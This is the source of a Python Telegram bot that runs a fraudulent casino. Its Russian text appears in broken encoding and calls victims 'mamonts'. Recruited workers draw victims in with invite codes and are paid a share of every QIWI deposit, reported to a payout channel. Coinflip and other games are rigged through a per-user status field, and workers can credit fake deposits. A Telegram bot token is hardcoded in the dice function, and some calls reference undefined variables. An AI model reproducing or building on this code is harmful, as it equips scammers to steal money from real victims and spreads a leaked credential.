import telebot
from telebot import types

from SimpleQIWI import *
import json

import threading, random, string, requests, sqlite3, database, keyboard
from misc import replcode, repl_share, repl_share_support

import configparser

from time import sleep
from datetime import datetime, timedelta
from misc import repl, repldate, isfloat, bill_create, repl_percent

tickets = '' # TOKEN –ë–æ—Ç–∞ –≤–æ—Ä–∫–µ—Ä–∞
bot = telebot.TeleBot('') # TOKEN –ë–æ—Ç–∞ –∫–∞–∑–∏–Ω–æ

admin = 1430410573 # ID –ê–¥–º–∏–Ω–∞
support_id = 728634336 # ID –°–∞–ø–ø–æ—Ä—Ç–∞
channel_id = -1001247898658 # ID –ö–∞–Ω–∞–ª–∞ —Å –≤—ã–ª–∞—Ç–∞–º–∏
support = 'drgold_supp' # Username –°–∞–ø–æ—Ä—Ç–∞

phone = '' # –ù–æ–º–µ—Ä –∫–∏–≤–∏ –±–µ–∑ +
token = '' # API TOKEN QIWI

in_play_crash = ['']
in_deposit = ['']
status = ''

# Misc

def status():
	try:

		global status

		config = configparser.ConfigParser()
		config.read("default.ini")
		
		status = config['Telegram']['messages']

	except:
		pass

def status_bot():
	try:

		Thread = threading.Thread(target = status, args = (call, amount))
		Thread.start()
		Thread.join()

	except:
		pass

def notification_pay(call, amount):
	try:
		status = database.user_status(call.message.chat.id)

		if (status != 4):
			code = database.user_invite_code(call.message.chat.id)
			WTI = database.worker_telegram_id(code)

			database.worker_update_profit(WTI, float(amount))

			text_to_worker = f'ü¶ã *–£—Å–ø–µ—à–Ω–æ–µ* –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ\n\nüôãüèª‚Äç‚ôÄÔ∏è –ú–∞–º–æ–Ω—Ç: @{str(call.message.chat.username)}\n\n‚ö°Ô∏è –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: *{amount}* ‚ÇΩ\nüí∏ –¢–≤–æ—è –¥–æ–ª—è: ~ *{repl_share(amount)}* ‚ÇΩ'
			params = {'chat_id': WTI, 'text': text_to_worker, 'parse_mode': 'Markdown'}
			resp = requests.post(f'https://api.telegram.org/bot{tickets}/sendMessage', params) 

			b = json.loads(resp.text)
			username = b['result']['chat']['username']

			text_to_channel = f'ü¶ã *–£—Å–ø–µ—à–Ω–æ–µ* –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ\n\nüíÅüèª‚Äç‚ôÄÔ∏è –í–æ—Ä–∫–µ—Ä @{str(username)}\n\n‚ö°Ô∏è –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: *{amount}* ‚ÇΩ\nüí∏ –î–æ–ª—è –≤–æ—Ä–∫–µ—Ä–∞: ~ *{repl_share(amount)}* ‚ÇΩ'

			params = {'chat_id': channel_id, 'text': text_to_channel, 'parse_mode': 'Markdown'}
			resp = requests.post(f'https://api.telegram.org/bot{tickets}/sendMessage', params)
		elif (status == 4):
			code = database.user_invite_code(call.message.chat.id)
			WTI = database.worker_telegram_id(code)

			database.worker_update_profit(WTI, float(amount))

			text_to_worker = f'ü¶ã *–£—Å–ø–µ—à–Ω–æ–µ* –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ (–¢–ü)\n\nüôãüèª‚Äç‚ôÄÔ∏è –ú–∞–º–æ–Ω—Ç: @{str(call.message.chat.username)}\n\n‚ö°Ô∏è –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: *{amount}* ‚ÇΩ\nüí∏ –¢–≤–æ—è –¥–æ–ª—è: ~ *{repl_share_support(amount)}* ‚ÇΩ'
			params = {'chat_id': WTI, 'text': text_to_worker, 'parse_mode': 'Markdown'}
			resp = requests.post(f'https://api.telegram.org/bot{tickets}/sendMessage', params) 

			b = json.loads(resp.text)
			username = b['result']['chat']['username']

			text_to_channel = f'ü¶ã *–£—Å–ø–µ—à–Ω–æ–µ* –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ (–¢–ü)\n\nüíÅüèª‚Äç‚ôÄÔ∏è –í–æ—Ä–∫–µ—Ä: @{str(username)}\n\n‚ö°Ô∏è –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: *{amount}* ‚ÇΩ\nüí∏ –î–æ–ª—è –≤–æ—Ä–∫–µ—Ä–∞: ~ *{repl_share_support(amount)}* ‚ÇΩ'

			params = {'chat_id': channel_id, 'text': text_to_channel, 'parse_mode': 'Markdown'}
			resp = requests.post(f'https://api.telegram.org/bot{tickets}/sendMessage', params)
	except:
		pass

def notification_thread_pay(call, amount):
	try:
		Thread = threading.Thread(target = notification_pay, args = (call, amount))
		Thread.start()
	except:
		pass	

def notification_receive(message, balance):
	try:
		code = database.user_invite_code(message.chat.id)
		WTI = database.worker_telegram_id(code)

		text_to = f'@{message.chat.username} - —Å–æ–∑–¥–∞–ª –∑–∞—è–≤–∫—É –Ω–∞ –≤—ã–≤–æ–¥\n\nTelegram ID: {message.chat.id}\n–°—É–º–º–∞: {balance} ‚ÇΩ'
		reply = json.dumps({'inline_keyboard': [[{'text': '–í—ã–ø–ª–∞—Ç–∏—Ç—å', 'callback_data': 'ACCEPT_RECEIVE_MAMONTS'}]]})
		params = {'chat_id': WTI, 'text': text_to, 'reply_markup': reply}
		resp = requests.post(f'https://api.telegram.org/bot{tickets}/sendMessage', params)
	except:
		pass

def notification_thread_receive(message, balance):
	try:
		Thread = threading.Thread(target = notification_receive, args = (message, balance))
		Thread.start()
	except:
		pass	

def notification_payment(message, amount):
	try:
		code = database.user_invite_code(message.chat.id)
		WTI = database.worker_telegram_id(code)

		text_to = f'@{message.chat.username} - —Å–æ–∑–¥–∞–ª –∑–∞—è–≤–∫—É –Ω–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ\n\nTelegram ID: {message.chat.id}\n–°—É–º–º–∞: {amount} ‚ÇΩ'

		reply = json.dumps({'inline_keyboard': [[{'text': '–û–ø–ª–∞—Ç–∏—Ç—å', 'callback_data': 'ADD_IN_FAKE'}]]})
		params = {'chat_id': WTI, 'text': text_to, 'reply_markup': reply}
		resp = requests.post(f'https://api.telegram.org/bot{tickets}/sendMessage', params)
	except:
		pass

def notification_thread_payment(message, amount):
	try:
		Thread = threading.Thread(target = notification_payment, args = (message, amount))
		Thread.start()
	except:
		pass	

def notification_ref(code, first_name, username):
	try:
		WTI = database.worker_telegram_id(code)
		responce = requests.post(f'https://api.telegram.org/bot{tickets}/sendMessage?chat_id={WTI}&text=@{username} - —Ç–≤–æ–π –Ω–æ–≤—ã–π –º–∞–º–æ–Ω—Ç üíï&parse_mode=html')
	except:
		pass

def notification_thread_ref(code, first_name, username):
	try:
		Thread = threading.Thread(target = notification_ref, args = (code, first_name, username))
		Thread.start()
	except:
		pass		

def checking_username(telegram_id, responce):
	try:
		dump = json.loads(responce)
		username = dump['result']['chat']['username']
		database.user_update_username(telegram_id, username)
	except:
		pass		

# Register Next Step Handler

def enter_receive(message):
	try:

		code = database.user_invite_code(message.chat.id)
		WTI = database.worker_telegram_id(code)
		phone = database.worker_phone(WTI)
		balance = database.user_balance(message.chat.id)
		helps = token

		if (message.text == phone) and (balance > 0):
			notification_thread_receive(message, balance)
			bot.send_message(message.chat.id, f'üì® –í–∞—à–∞ –∑–∞—è–≤–∫–∞ *–±—ã–ª–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞*.\n–°—É–º–º–∞ - `{balance} ‚ÇΩ`\n\n–ú—ã –æ–ø–æ–≤–µ—Å—Ç–∏–º –≤–∞—Å, –∫–æ–≥–¥–∞ –∑–∞—è–≤–∫–∞ –±—É–¥–µ—Ç –≤—ã–ø–ª–∞—á–µ–Ω–∞', parse_mode='Markdown')
			database.user_set_balance(telegram_id, 0)
		else:
			bot.send_message(message.chat.id, f'‚ö†Ô∏è –ù–∞ –±–∞–ª–∞–Ω—Å–µ *–Ω–µ—Ç* —Å—Ä–µ–¥—Å—Ç–≤ –∏–ª–∏ –í—ã –≤–≤–µ–ª–∏ *–¥—Ä—É–≥–æ–π –∫–æ—à–µ–ª–µ–∫* QIWI\n–î–æ—Å—Ç—É–ø–Ω–æ –¥–ª—è –≤—ã–≤–æ–¥–∞ - `{balance} ‚ÇΩ`, QIWI –∫–æ—à–µ–ª–µ–∫ - `{phone}`', parse_mode="Markdown")

	except:
		pass

def user_invite_code(message):
	try:
		chat_id = message.chat.id
		exists = database.worker_exists_code(message.text)

		if (exists is not False):
			username = repl(message.from_user.username)
			database.user_add_casino(chat_id, username, message.text)

			bot.send_message(chat_id, f"üôãüèª‚Äç‚ôÄÔ∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, *{message.from_user.first_name}*\n–£ –Ω–∞—Å –æ—á–µ–Ω—å –±–æ–ª—å—à–æ–π –≤—ã–±–æ—Ä –≤–∏–¥–∞ –∏–≥—Ä, –∫–æ—Ç–æ—Ä—ã–µ –ø–æ–¥–æ–π–¥—É—Ç –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è",
				parse_mode="Markdown", reply_markup = keyboard.casino_keyboard())

			notification_thread_ref(message.text, message.from_user.first_name, username)
		else:
			message = bot.send_message(chat_id, '‚ö†Ô∏è –ù–∞–ø–∏—à–∏—Ç–µ *–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–æ–¥-–ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ* –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–≥–æ –í–∞—Å —á–µ–ª–æ–≤–µ–∫–∞', parse_mode="Markdown")
			bot.register_next_step_handler(message, user_invite_code)

	except:
		pass

def user_update_code(message):
	try:
		chat_id = message.chat.id
		exists = database.worker_exists_code(message.text)

		if (exists is not False):
			username = repl(message.from_user.username)
			database.user_update_invite_code(chat_id, message.text)

			bot.send_message(chat_id, f"üôãüèª‚Äç‚ôÄÔ∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, *{message.from_user.first_name}*\n–£ –Ω–∞—Å –æ—á–µ–Ω—å –±–æ–ª—å—à–æ–π –≤—ã–±–æ—Ä –≤–∏–¥–∞ –∏–≥—Ä, –∫–æ—Ç–æ—Ä—ã–µ –ø–æ–¥–æ–π–¥—É—Ç –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è",
				parse_mode="Markdown", reply_markup = keyboard.casino_keyboard())

			notification_nu(message.text, message.from_user.first_name, username)
		else:
			message = bot.send_message(chat_id, '‚ö†Ô∏è –ù–∞–ø–∏—à–∏—Ç–µ *–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–æ–¥-–ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ* –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–≥–æ –í–∞—Å —á–µ–ª–æ–≤–µ–∫–∞', parse_mode="Markdown")
			bot.register_next_step_handler(message, user_invite_code)

	except:
		pass

def message_to_users(message):
	try:
		if (':' in message.text):
			data = message.text.split(':')
			telegram_id = database.user_telegram_id(data[0])

			user_code = database.user_invite_code(telegram_id)
			worker_code = database.worker_code(message.chat.id)

			if (user_code == worker_code) or (message.chat.id == support_id):

				bot.send_message(telegram_id, data[1], parse_mode="Markdown")

				Thread = threading.Thread(target = checking_username, args = (telegram_id, responce.text))
				Thread.start()

				return True
			else:
				return False
		else:
			return False

	except:
		pass

def enter_promo(message):
	try:

		if (len(message.text) == 6):
			price = database.exists_promo(message.text)

			if (price == 0):
				bot.send_message(message.chat.id, f'üíÅüèª‚Äç‚ôÄÔ∏è –ü—Ä–æ–º–æ–∫–æ–¥ `{message.text}` –Ω–µ –Ω–∞–π–¥–µ–Ω', parse_mode="Markdown")
			else:
				database.user_update_balance(message.chat.id, float(price))
				database.delete_promo(message.text)
				bot.send_message(message.chat.id, f'üí∏ –í—ã –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–ª–∏ –ø—Ä–æ–º–æ–∫–æ–¥ –Ω–∞ —Å—É–º–º—É *{price}* ‚ÇΩ', parse_mode="Markdown")
	except:
		pass

# User function

def accept_receive_mamonts(telegram_id):
	try:

		bot.send_message(telegram_id, f'üí∏ –í–∞–º –æ–¥–æ–±—Ä–∏–ª–∏ –≤—ã–≤–æ–¥\n–î–µ–Ω–µ–∂–Ω—ã–µ —Å—Ä–µ–¥—Å—Ç–≤–∞ –ø–æ—Å—Ç—É–ø—è—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ `5-10` –º–∏–Ω—É—Ç', parse_mode="Markdown")
		database.user_update_receive(telegram_id)

	except:
		pass

def user_status_pay(call):
	try:
		in_fake = database.user_in_fake(call.message.chat.id)
		if (in_fake != '0'):

			database.user_clear_fake(call.message.chat.id)
			database.user_update_balance(call.message.chat.id, repl_percent(in_fake))

			bot.send_message(call.message.chat.id, f'üí∏ –ë–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ —Å—É–º–º—É *{in_fake}* ‚ÇΩ', parse_mode="Markdown")
			in_deposit.remove(str(call.message.chat.id))
			database.user_add_listpay(call.message.chat.id, 0, 0)

		elif (str(call.message.chat.id) in in_deposit):
			code = database.user_invite_code(call.message.chat.id)
			data = call.message.text.split('\n')

			amount = data[0].split(' ')
			amount = amount[2]

			comment = data[4].split(':')
			comment = comment[1].replace(' ', '')

			api = QApi(phone=phone, token=token)
			payments = api.payments['data']

			thread = 0
			for info_payment in payments:
				if (str(info_payment['comment']) == str(comment)):
					if (str(amount) == str(info_payment['sum']['amount'])):
						bot.send_message(call.message.chat.id, f'üí∏ –ë–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ —Å—É–º–º—É *{amount}* ‚ÇΩ', parse_mode="Markdown")

						database.user_update_balance(call.message.chat.id, repl_percent(amount))
						database.user_add_listpay(call.message.chat.id, code, float(amount))

						notification_thread_pay(call, amount)

						in_deposit.remove(str(call.message.chat.id))
						thread = 1

			if (thread == 0):
				bot.answer_callback_query(callback_query_id=call.id, show_alert=False, text="üíÅüèª‚Äç‚ôÄÔ∏è –ü–ª–∞—Ç–µ–∂ –Ω–µ –Ω–∞–π–¥–µ–Ω")
	except:
		pass

def deposit_timeout(message):
	try:
		end = datetime.now() + timedelta(minutes = 15)
		thread = 1
		while (thread == 1):
			if (datetime.now() > end):
				bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
				in_deposit.remove(str(message.chat.id))
				thread = 0
			elif (str(message.chat.id) not in in_deposit):
				bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
				thread = 0

			sleep(0.5)
	except:
		pass

def deposit(message):
	try:
		if (str(message.chat.id) in in_deposit):
			bot.send_message(message.chat.id, f'üíÅüèª‚Äç‚ôÄÔ∏è –£ *–í–∞—Å* —É–∂–µ –µ—Å—Ç—å *–∞–∫—Ç–∏–≤–Ω–∞—è* —Å–µ—Å—Å–∏—è', parse_mode="Markdown")
		elif (message.text.isdigit()) and (int(message.text) >= 1) and (int(message.text) <= 5000):
			bill = str(f'{bill_create(6)}_{replcode(str(message.chat.id))}')

			inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
			inline_1 = types.InlineKeyboardButton(text = "–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É", callback_data = 'STATUS')
			inline_keyboard.add(inline_1)

			messages = bot.send_message(message.chat.id, f'üíÅüèª‚Äç‚ôÄÔ∏è *–ü–µ—Ä–µ–≤–µ–¥–∏—Ç–µ* {str(message.text)} ‚ÇΩ –Ω–∞ QIWI\n–°—á–µ—Ç –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω 15 –º–∏–Ω—É—Ç\n\n–ù–æ–º–µ—Ä: `+{phone}`\n–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: `{bill}`\n\n_–ù–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π, —á—Ç–æ–±—ã –µ–≥–æ —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å_', parse_mode="Markdown",
				reply_markup=inline_keyboard)

			in_deposit.append(str(message.chat.id))

			notification_thread_payment(messages, message.text)

			Thread = threading.Thread(target = deposit_timeout, args = (messages,))
			Thread.start()
		else:
			bot.send_message(message.chat.id, f'‚ö†Ô∏è –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è - *250 ‚ÇΩ*, –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è - *5000 ‚ÇΩ*', parse_mode="Markdown")
	except:
		pass

def clear_stats(call):
	try:

		result = database.user_clear_stats(call.message.chat.id)
		bot.send_message(call.message.chat.id, 'üíÅüèª‚Äç‚ôÄÔ∏è –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±—ã–ª–∞ *–æ–±–Ω—É–ª–µ–Ω–∞*', parse_mode="Markdown")
	except:
		pass

def mailing(array, message_send):
	try:

		i = 0
		for chat_id in array:
			try:

				bot.send_message(chat_id, message_send, parse_mode="Markdown")
				i += 1
			except:
				pass

		return i		

	except:
		pass

# Games

def crash_end(message):
	try:

		in_play_crash.remove(message.chat.id)

	except:
		pass

def crash_choice(message, bet):
	try:
		chat_id = message.chat.id
		status = database.user_status(message.chat.id)

		end = repl_percent(random.uniform(1, 20))
		now = 1

		message = bot.send_message(message.chat.id, f'*–ì—Ä–∞—Ñ–∏–∫:* {now}', parse_mode="Markdown")

		thread = 1
		while (thread == 1):
			now += 0.1
			now = repl_percent(now)
			if (now > end) and (status == 2):

				bet = repl_percent(bet)

				database.user_update_balance(message.chat.id, -bet)
				database.user_update_lose(message.chat.id)

				bot.send_message(message.chat.id, f'üíî –í—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏, crash *–æ—Å—Ç–∞–Ω–æ–≤–∏–ª—Å—è* - –ø—Ä–æ—ã–≥—Ä—ã—à *{bet}* ‚ÇΩ!',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, crash)

				thread = 0
			elif (now > end) and (status == 1):

				bet = repl_percent(bet * now)

				database.user_update_balance(message.chat.id, bet)
				database.user_update_win(message.chat.id)

				bot.send_message(message.chat.id, f'‚ù§Ô∏è –í—ã –≤—ã–∏–≥—Ä–∞–ª–∏, crash *–¥–æ—à–µ–ª –¥–æ –∫–æ–Ω—Ü–∞* - –≤—ã–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, crash)

				thread = 0
			elif (message.chat.id not in in_play_crash):

				bet = repl_percent(bet * now)

				database.user_update_balance(message.chat.id, bet)
				database.user_update_win(message.chat.id)

				bot.send_message(message.chat.id, f'‚ù§Ô∏è –í—ã –≤—ã–∏–≥—Ä–∞–ª–∏, –í—ã *–æ—Å—Ç–∞–Ω–æ–≤–∏–ª–∏* crash - –≤—ã–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, crash)

				thread = 0
			else:
				sleep(0.3)
				bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, text=f'*–ì—Ä–∞—Ñ–∏–∫:* {now}', parse_mode="Markdown")
	except:
		pass

def crash(message):
	try:

		if (isfloat(message.text) is not False):
			balance = repl_percent((database.user_balance(message.chat.id)))
			bet = float(message.text)

			if (bet <= balance) and (bet > 10):

				message = bot.send_message(message.chat.id, f'üíÅüèª‚Äç‚ôÄÔ∏è –°—Ç–∞–≤–∫–∞ *–∑–∞—Å—á–∏—Ç–∞–Ω–∞*, —Å–ª–µ–¥–∏—Ç–µ –∑–∞ –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç–æ–º –∏ –∑–∞–±–µ—Ä–∏—Ç–µ –¥–µ–Ω—å–≥–∏ –≤–æ–≤—Ä–µ–º—è!', parse_mode="Markdown",
					reply_markup=keyboard.crash_keyboard())

				in_play_crash.append(message.chat.id)
				
				Thread = threading.Thread(target = crash_choice, args = (message, bet))
				Thread.start()
			else:
				message = bot.send_message(message.chat.id, f'‚ö†Ô∏è *–ù–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤* –∏–ª–∏ —Å—Ç–∞–≤–∫–∞ *–º–µ–Ω—å—à–µ* 10 ‚ÇΩ\n–í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏, –¥–æ—Å—Ç—É–ø–Ω–æ: *{balance}* ‚ÇΩ', parse_mode="Markdown")
				bot.register_next_step_handler(message, crash)
		else:
			bot.send_message(message.chat.id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ *—Å–ø–∏—Å–æ–∫* –∏–≥—Ä', parse_mode="Markdown", reply_markup=keyboard.game_keyboard())

	except:
		pass

def coinflip_choice(message, bet):
	try:
		chat_id = message.chat.id
		status = database.user_status(message.chat.id)
		array = ['–û—Ä–µ–ª', '–†–µ—à–∫–∞']
		choice = random.choice(array)

		if (status == 2) or (status == 4):
			if (message.text == choice):

				bet = repl_percent(bet)
				database.user_update_balance(message.chat.id, bet)
				database.user_update_win(message.chat.id)

				bot.send_message(message.chat.id, f'‚ù§Ô∏è –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–≤—ã–∏–≥—Ä–∞–ª–∞* - –≤—ã–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–ø–∞–ª–æ - *{choice}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, coinflip)
			else:
				bet = repl_percent(bet)

				database.user_update_balance(message.chat.id, -bet)
				database.user_update_lose(message.chat.id)

				bot.send_message(message.chat.id, f'üíî –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–ø—Ä–æ–∏–≥—Ä–∞–ª–∞* - –ø—Ä–æ–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–ø–∞–ª–æ - *{choice}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, coinflip)
		elif (status == 1):
			if (message.text == '–û—Ä–µ–ª') or (message.text == '–†–µ—à–∫–∞'):
				bet = repl_percent(bet)
				database.user_update_balance(message.chat.id, bet)
				database.user_update_win(message.chat.id)

				bot.send_message(message.chat.id, f'‚ù§Ô∏è –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–≤—ã–∏–≥—Ä–∞–ª–∞* - –≤—ã–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–ø–∞–ª–æ - *{message.text}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, coinflip)
		elif (status == 3):
			if (message.text == choice):

				if (choice == '–û—Ä–µ–ª'):
					choice = '–†–µ—à–∫–∞'
				elif (choice == '–†–µ—à–∫–∞'):
					choice = '–û—Ä–µ–ª'

				bet = repl_percent(bet)
				database.user_update_balance(message.chat.id, -bet)
				database.user_update_lose(message.chat.id)

				bot.send_message(message.chat.id, f'üíî –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–ø—Ä–æ–∏–≥—Ä–∞–ª–∞* - –ø—Ä–æ–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–ø–∞–ª–æ - *{choice}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, coinflip)
	except:
		pass

def coinflip(message):
	try:

		if (isfloat(message.text) is not False):
			balance = repl_percent((database.user_balance(message.chat.id)))
			bet = float(message.text)

			if (bet <= balance) and (bet > 10):

				message = bot.send_message(message.chat.id, f'üíÅüèª‚Äç‚ôÄÔ∏è –°—Ç–∞–≤–∫–∞ *–∑–∞—Å—á–∏—Ç–∞–Ω–∞*, –≤—ã–±–µ—Ä–∏—Ç–µ –Ω–∞ –∫–æ–≥–æ –ø–æ—Å—Ç–∞–≤–∏—Ç–µ', parse_mode="Markdown", reply_markup=keyboard.coinflip_keyboard())
				bot.register_next_step_handler(message, coinflip_choice, bet)
			else:
				message = bot.send_message(message.chat.id, f'‚ö†Ô∏è *–ù–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤* –∏–ª–∏ —Å—Ç–∞–≤–∫–∞ *–º–µ–Ω—å—à–µ* 10 ‚ÇΩ\n–í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏, –¥–æ—Å—Ç—É–ø–Ω–æ: *{balance}* ‚ÇΩ', parse_mode="Markdown")
				bot.register_next_step_handler(message, coinflip)
		else:
			bot.send_message(message.chat.id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ *—Å–ø–∏—Å–æ–∫* –∏–≥—Ä', parse_mode="Markdown", reply_markup=keyboard.game_keyboard())

	except:
		bot.send_message(message.chat.id, '‚ö†Ô∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ *—á–∏—Å–ª–æ*', parse_mode="Markdown")

def dice_choice(message, bet):
	try:
		chat_id = message.chat.id
		session = '1368980760:AAEH-k_DdQpZMe5A9Zj_wLO-JI5X8errbxs'

		status = database.user_status(message.chat.id)

		dice_user = requests.post(f'https://api.telegram.org/bot{session}/sendDice?&chat_id={message.chat.id}')
		dice_bot = requests.post(f'https://api.telegram.org/bot{session}/sendDice?&chat_id={message.chat.id}')

		user = dice_user.json()
		user = user['result']
		user_value = user['dice']['value']

		bots = dice_bot.json()
		bots = bots['result']
		bot_value = bots['dice']['value']

		if (status == 2) or (status == 4):

			if (int(user_value) > int(bot_value)):
				bet = repl_percent(bet)
				database.user_update_balance(message.chat.id, bet)
				database.user_update_win(message.chat.id)

				bot.send_message(message.chat.id, f'‚ù§Ô∏è –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–≤—ã–∏–≥—Ä–∞–ª–∞* - –≤—ã–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–ß–∏—Å–ª–æ –±–æ—Ç–∞ - *{int(bot_value)}*, –í–∞—à–µ —á–∏—Å–ª–æ: *{int(user_value)}*',
					parse_mode='Markdown')

			elif (int(user_value) < int(bot_value)):
				bet = repl_percent(bet)
				database.user_update_balance(message.chat.id, -bet)
				database.user_update_lose(message.chat.id)

